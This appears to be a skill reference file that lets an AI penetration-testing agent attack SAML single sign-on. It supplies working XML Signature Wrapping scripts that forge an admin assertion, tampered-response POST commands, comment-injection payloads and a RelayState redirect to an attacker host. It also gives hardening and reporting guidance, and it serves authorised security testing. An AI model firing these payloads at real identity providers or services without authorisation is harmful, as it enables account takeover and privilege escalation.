---
name: SAML Attacks
description: Reference for SAML attacks covering XML Signature Wrapping (XSW), Comment Injection, Golden SAML, replay across SPs, RelayState abuse, and SAMLResponse / SAMLRequest tampering.
---

# SAML Attacks

Reference for testing SAML 2.0 SSO flows. Pull this in when the target uses SAML for federation (Okta, ADFS, Azure AD, OneLogin, Auth0 in SAML mode, custom IdPs) and you have at least one captured `SAMLRequest` / `SAMLResponse` to mutate.

> Black-box scope: probes drive the SP / IdP HTTP endpoints, modify SAML messages, and observe the resulting session. Tool support: `python3-saml` (now installed), `execute_code` for assertion building.

## Tool wiring

| Action | Tool | Notes |
|---|---|---|
| Capture the live SAML flow | `execute_playwright` | Drive login, capture `SAMLRequest`/`SAMLResponse` from network. |
| Decode / modify SAML messages | `execute_code` | `python3-saml` for signature, base64 + zlib for transport encoding. |
| Replay tampered messages | `execute_curl` | POST to the SP's ACS / IdP's SSO endpoint. |
| Sign attacker-controlled assertions | `execute_code` | `python3-saml` + `lxml` + `xmlsec` (pulled in as a transitive dep). |
| Side-channel probes | `kali_shell interactsh-client` | OOB confirmation when assertion fields trigger fetches. |

## SAML primer

A SAML SSO flow has two primary HTTP messages:

| Direction | Message | Encoding |
|---|---|---|
| SP -> IdP (via browser) | `SAMLRequest` (AuthnRequest) | base64 of (DEFLATE-compressed XML) for HTTP-Redirect, or base64 of XML for HTTP-POST |
| IdP -> SP (via browser) | `SAMLResponse` (Response containing Assertion) | base64 of XML, HTTP-POST binding |

Plus optional:

- `RelayState` (opaque parameter, often used for redirect destination after login).
- `Signature` / `SignedInfo` blocks for XML signing.
- `EncryptedAssertion` for confidentiality.

The trust anchor is the IdP's signing X.509 certificate, configured at the SP. The SP validates the signature on the response / assertion against this cert.

## Reconnaissance

### Capture the flow

Drive the login via Playwright, intercept POSTs containing `SAMLRequest=` or `SAMLResponse=`:

```
execute_playwright url: "https://sp.target.tld/login" script: |
  page.goto("https://sp.target.tld/login")
  with page.expect_request(lambda r: "SAMLResponse" in (r.post_data or "")) as info:
      # complete the IdP login flow manually or with Playwright fill
      page.fill("#idp-username", "alice@target.tld")
      page.fill("#idp-password", "$PASS_A")
      page.click("#idp-submit")
  req = info.value
  print(req.url)
  print(req.post_data)
```

### Decode the messages

```
execute_code language: python
import base64, zlib, urllib.parse
def decode_redirect(b64):           # HTTP-Redirect binding
    raw = base64.b64decode(urllib.parse.unquote(b64))
    return zlib.decompress(raw, -15).decode()    # negative wbits = no header
def decode_post(b64):                # HTTP-POST binding (no DEFLATE)
    return base64.b64decode(urllib.parse.unquote(b64)).decode()

# Try both:
print(decode_post("<paste base64>"))
```

### Identify SP entityId and ACS

```
GET /Saml2/Metadata          (Spring Security)
GET /saml/metadata           (django-saml)
GET /sso/metadata            (Okta-style)
GET /simplesaml/saml2/idp/metadata.php
```

The SP metadata XML reveals:

- `entityID` (audience).
- `AssertionConsumerService` URL (where the response is POSTed).
- Trusted signing certificate(s).
- Required NameID format.
- Whether `WantAssertionsSigned` and `AuthnRequestsSigned` are enforced.

### Identify IdP

```
GET https://idp.target.tld/.well-known/saml-configuration   (rare)
SAMLRequest <Issuer> field reveals SP entityId
SAMLResponse <Issuer> reveals IdP entityId
```

Common IdPs and their footprints:

| Footprint in response | IdP |
|---|---|
| `okta.com/sso/saml/...` | Okta |
| `adfs/services/trust` | Microsoft ADFS |
| `login.microsoftonline.com` | Azure AD |
| `accounts.google.com/o/saml2` | Google Workspace |
| `onelogin.com/saml` | OneLogin |

## Captured-traffic workflow (proxy_brain tools)

If HTTP Traffic Capture is enabled, source and drive the SAML probes from the recorded ACS POST instead of rebuilding the flow by hand. proxy_brain tools only see traffic that went through the capture proxy, so drive the SSO login (`execute_playwright`) through it first.

- `redamon.search({"bodyq":"SAMLResponse","method":"POST"})` locates the captured POST to the SP's ACS; `redamon.get(<acs_txn>, "both")` returns the full `SAMLResponse=` / `RelayState=` body to decode and the Set-Cookie session it produced.
- Replay-twice freshness test (the cleanest first probe): `redamon.replay(<acs_txn>, {})` re-POSTs the identical captured response to the ACS. A second successful session proves replay-detection / `NotOnOrAfter` freshness is gone. This runs against the pinned SP ACS host, exactly where you want it.
- Mutation probes against the same ACS: build the XSW variant, Comment Injection NameID, or audience-stripped assertion (per the attack matrix / probe template below), base64-encode it, and `redamon.replay(<acs_txn>, {"body":"SAMLResponse=<encoded>&RelayState=<relay>"})`. One variant per replay; cycle the 8 XSW positions.
- `redamon.diff(<legit_acs_response>, <tampered_acs_response>)` confirms whether the tampered assertion minted an equivalent session (Set-Cookie, redirect, status); `redamon.to_curl(id)` renders the winning POST for the report.

Caveat: redamon.replay pins host/scheme/port to the origin ACS transaction, which is exactly the SP endpoint you target, but it cannot pivot to a second SP for the cross-SP replay test (section 3) on a different host: use execute_curl there. IdP-side steps and browser consent still need execute_playwright.

## Attack matrix

### 1. XML Signature Wrapping (XSW)

The canonical SAML attack. Same family as SOAP XSW (see `/skill soap_ws_security`); the difference is which element is signed and which the SP consumer reads.

```xml
<samlp:Response>
  <ds:Signature>
    <ds:SignedInfo>
      <ds:Reference URI="#legit-assertion-id"/>
    </ds:SignedInfo>
    <ds:SignatureValue>...</ds:SignatureValue>
  </ds:Signature>

  <!-- Attacker keeps the legitimate assertion (signed) here -->
  <saml:Assertion ID="legit-assertion-id">
    <saml:Subject><saml:NameID>alice@target.tld</saml:NameID></saml:Subject>
  </saml:Assertion>

  <!-- And injects a malicious assertion the consumer reads -->
  <saml:Assertion ID="evil-assertion-id">
    <saml:Subject><saml:NameID>admin@target.tld</saml:NameID></saml:Subject>
  </saml:Assertion>
</samlp:Response>
```

Variants per Somorovsky et al., "On Breaking SAML: Be Whoever You Want to Be" (USENIX 2012, 8 canonical XSW types):

| Variant | Position of evil assertion |
|---|---|
| 1 | Wrapping in `Extensions` |
| 2 | Wrapping in `Object` (signature element) |
| 3 | Sibling of original assertion (after signature) |
| 4 | Sibling of original assertion (before signature) |
| 5 | Wrapping inside the original assertion |
| 6 | Wrapping inside the original assertion (deeper) |
| 7 | Wrapping inside `Object` element of signature |
| 8 | Wrapping with `Object` containing `Extensions` |

Probe with `python3-saml` or build manually:

```
execute_code language: python
import base64
LEGIT_RESPONSE = open("/tmp/captured_response.xml").read()
# Inject XSW variant 3: duplicate assertion as next sibling
EVIL_ASSERTION = """<saml:Assertion ID="evil"><saml:Subject><saml:NameID>admin@target.tld</saml:NameID></saml:Subject>...</saml:Assertion>"""
modified = LEGIT_RESPONSE.replace("</saml:Assertion>", "</saml:Assertion>" + EVIL_ASSERTION, 1)
encoded = base64.b64encode(modified.encode()).decode()
print(encoded)
```

POST the encoded payload to the SP's ACS:

```
execute_curl url: "https://sp.target.tld/saml/acs" method: "POST" data: "SAMLResponse=$ENCODED&RelayState=$RELAY"
```

If the SP consumer reads `evil` while the verifier validates `legit-assertion-id`, the user is logged in as `admin`.

### 2. Comment Injection (Kelby Ludwig / Duo Security, 2018)

```xml
<saml:NameID>admin@target.tld<!--evil-->.attacker.tld</saml:NameID>
```

Some XML parsers (and some text-extraction libraries) strip comments AFTER signing but BEFORE consumption, so the signed value is `admin@target.tld<!--evil-->.attacker.tld` but the consumer reads `admin@target.tld`.

Affected libraries / versions (2018 disclosure): `python-saml < 2.4.0`, OneLogin Ruby SAML toolkit `< 1.7.2`, OmniAuth-SAML `< 1.10.0`. Modern versions are patched; legacy stacks remain at risk.

```
NameID input:                  alice@example.com
Modified NameID:               admin@target.tld<!---->.example.com
Signature still valid:         YES (the canonicalized form retains the comment)
SP-side text extraction:       admin@target.tld.example.com    or    admin@target.tld
```

The exact bypass depends on which library extracts the text. Try several variants:

```
admin@target.tld<!--x-->
admin@target.tld<!---->.test.com
<!--x-->admin@target.tld
admin<!--x-->@target.tld
```

### 3. Replay across SPs

```
SAMLResponse audience: https://sp1.target.tld/saml/acs
Replay at:              https://sp2.target.tld/saml/acs
```

If `sp2`'s SP-side validation does NOT check the `Audience` matches its own `entityID`, the response is accepted. Especially common in stacks where multiple SPs share the same IdP cert.

### 4. RelayState abuse

`RelayState` is opaque to SAML but is often used by SPs as a return-URL.

```
POST /saml/acs    SAMLResponse=$RESP&RelayState=https://attacker.tld/cb
```

After successful auth, the SP redirects to `RelayState` -- if not allowlisted, this is open-redirect post-login -> phishing pivot.

See `/skill open_redirect` for the broader chain.

### 5. Audience confusion

```xml
<saml:AudienceRestriction>
  <saml:Audience>https://sp.target.tld</saml:Audience>
</saml:AudienceRestriction>
```

Probes:

- Strip `<AudienceRestriction>` entirely.
- Add a SECOND `<Audience>` matching attacker SP.
- Misformat the URI (trailing slash, http vs https, port).

If the SP doesn't enforce strict audience matching, replay across audiences works.

### 6. Time validity (`NotBefore` / `NotOnOrAfter`)

```xml
<saml:Conditions
  NotBefore="2025-01-01T00:00:00Z"
  NotOnOrAfter="2025-12-31T23:59:59Z">
```

Probes:

- Reuse a captured response weeks later (server should reject by `NotOnOrAfter`).
- Submit a response with `NotBefore` in the future.
- Submit without `<Conditions>`.

If accepted, the freshness check is broken.

### 7. Subject confirmation

```xml
<saml:SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer">
  <saml:SubjectConfirmationData
    Recipient="https://sp.target.tld/saml/acs"
    NotOnOrAfter="..."
    InResponseTo="<original-request-id>"/>
</saml:SubjectConfirmation>
```

Probes:

- Strip `Recipient` (so no audience binding on the confirmation).
- Set `Recipient` to attacker SP.
- Reuse `InResponseTo` to bypass replay-detection that's keyed on this field.

### 8. Algorithm downgrade

```xml
<ds:SignatureMethod Algorithm="http://www.w3.org/2000/09/xmldsig#rsa-sha1"/>
```

SHA-1 is deprecated. Servers should reject; many still accept. With sufficient compute, attackers can forge SHA-1 collisions for assertions.

Probe by submitting RSA-SHA1-signed responses. If accepted, file as a finding even if forgery is impractical.

### 9. SAMLRequest tampering (force-IdP / SP confusion)

When the SP's metadata advertises multiple IdPs:

```
SAMLRequest with <Issuer>https://attacker-controlled-sp.tld</Issuer>
```

Some IdPs honor the `Issuer` to decide which ACS to send the response to. Pair with attacker-controlled IdP for full token redirection.

### 10. Golden SAML

If attacker compromises the IdP's signing key (out of scope for black-box, but worth flagging in reporting), they can forge any assertion for any user across every SP that trusts that IdP. This is the "Golden Ticket" of SAML.

Black-box hint: if the IdP private key is leaked (extracted from a stolen ADFS server, exposed in a backup, etc.), the attacker effectively owns every federated SP.

### 11. Encrypted assertion bypass

```xml
<saml:EncryptedAssertion>
  <xenc:EncryptedData>...</xenc:EncryptedData>
</saml:EncryptedAssertion>
```

Probes:

- Submit unencrypted `<saml:Assertion>` where the SP expects `<saml:EncryptedAssertion>`. If accepted, encryption is optional (downgrade).
- Submit `<saml:EncryptedAssertion>` with an unsigned outer wrapper.

### 12. EntityID spoofing

```xml
<saml:Issuer>https://idp.target.tld</saml:Issuer>
```

If the SP allows any IdP entityId (no allowlist), attacker forges responses with their own IdP entityId and signs with their own key.

## Probe template

```
execute_code language: python
import base64
from onelogin.saml2.utils import OneLogin_Saml2_Utils
from lxml import etree

# 1. Capture legitimate response (after Playwright / network capture)
captured_b64 = "<paste from request>"
xml = base64.b64decode(captured_b64).decode()

# 2. Mutate (XSW variant 3 example)
tree = etree.fromstring(xml)
ns = {"samlp":"urn:oasis:names:tc:SAML:2.0:protocol",
      "saml":"urn:oasis:names:tc:SAML:2.0:assertion",
      "ds":"http://www.w3.org/2000/09/xmldsig#"}
original_assertion = tree.find("saml:Assertion", ns)
evil = etree.fromstring("""<saml:Assertion xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion" ID="evil">
  <saml:Subject><saml:NameID>admin@target.tld</saml:NameID></saml:Subject>
  <saml:AttributeStatement><saml:Attribute Name="role"><saml:AttributeValue>admin</saml:AttributeValue></saml:Attribute></saml:AttributeStatement>
</saml:Assertion>""")
original_assertion.addnext(evil)

# 3. Re-encode
modified = etree.tostring(tree, xml_declaration=True, encoding="utf-8")
b64 = base64.b64encode(modified).decode()
print(b64)
```

POST the resulting `SAMLResponse=` value to the SP's ACS and check the resulting session.

## Validation shape

A clean SAML finding includes:

1. The captured legitimate response (decoded XML for evidence).
2. The modified response (with the bypass technique highlighted).
3. The SP's ACS URL and the POST body sent.
4. The resulting session (cookie + a privileged request confirming the assumed identity).
5. The bypass class explicitly named (XSW-N / Comment Injection / Audience Confusion / Replay / RelayState / Algorithm Downgrade).
6. The IdP and SP libraries / versions when fingerprinted.

## False positives

- SP rejects all attempts with `urn:oasis:names:tc:SAML:2.0:status:Responder` or generic `403`.
- SP enforces strict XML schema validation, including ID-uniqueness checks (defeats most XSW).
- SP uses signature canonicalization that includes the comment (Comment Injection blocked).
- SP requires signed AuthnRequest AND signed Response AND encrypted Assertion (defense in depth).
- IdP rejects responses with unknown SP entityId.

## Hardening summary

- Use a hardened, recent SAML library (`python3-saml >= 2.4`, `OneLogin_Saml2 >= 4.x`, `Spring Security 5.5+`, etc.).
- Enforce strict XML schema validation; reject documents with multiple `<Assertion>` elements.
- Verify the signature scope element-by-element with namespace-aware ID resolution.
- Strip / canonicalize comments BEFORE signing (or after, but symmetric on both sides).
- Pin `Audience` to the SP's exact `entityID`.
- Enforce `NotBefore` / `NotOnOrAfter` with a tight skew window.
- Reject SHA-1 signature methods.
- Allowlist `RelayState` URLs against an allowed-origin list; never honor arbitrary URLs.
- Pin IdP signing certificates per `entityID`; reject responses from unknown issuers.
- Require encrypted assertions where confidentiality matters.
- Audit log every assertion validation success and failure with the full XML.

## Hand-off

```
XSW success                          -> escalate; auth bypass / privilege escalation across the federated app
Comment Injection                     -> Library-version finding; combine with /skill information_disclosure
Replay across SPs                     -> file as Audience Confusion + chain to additional SPs in the federation
RelayState open redirect              -> /skill open_redirect
Algorithm downgrade                   -> note as defense-in-depth gap; not always immediately exploitable
JWT bearer post-SAML                  -> /skill jwt_attacks (if SP issues JWT after SAML auth)
WS-Federation handoff                 -> /skill soap_ws_security
```

## Pro tips

- The cleanest first probe is replay -- send the SAME captured response twice. If the SP doesn't reject the second, the freshness / replay-detection is gone.
- XSW's success depends on the specific library version; cycle through 8 variants because libraries handle them differently.
- Comment Injection is highly specific to the text-extraction library. Probe with multiple variants (`<!---->`, `<!--x-->`, etc.).
- Audience checks are the most-skipped validation in legacy SP implementations.
- For `python3-saml`, the test suite includes XSW examples; mining the test fixtures gives ready-made probe payloads.
- Encrypted assertions are NOT a defense against XSW alone; they protect confidentiality, not signature verification.
- Single Logout (SLO) flows have their own attack surface (replay, RelayState abuse on logout); check both.
